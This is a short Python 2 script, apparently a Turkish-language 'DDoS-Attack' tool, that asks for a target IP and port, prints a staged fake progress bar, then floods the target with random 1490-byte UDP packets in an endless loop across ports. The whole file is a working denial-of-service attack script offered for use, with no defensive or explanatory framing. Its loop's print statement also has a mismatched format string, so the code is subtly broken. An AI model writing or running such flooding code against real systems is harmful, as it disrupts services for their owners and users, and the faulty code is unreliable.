import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print
print "Kodlayan  : Mansur"
print "Github    : https://github.com/mansur47"
print "Instagram : https://instagram.com/mansur.sec"

os.system("clear")
os.system("figlet DDoS-Attack")


ip = raw_input("Hedef IP : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Saldiri Baslamistir")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "%s paket %s e yollanmistir port:%s"%(ip,port) 
     if port == 65534:
       port = 1
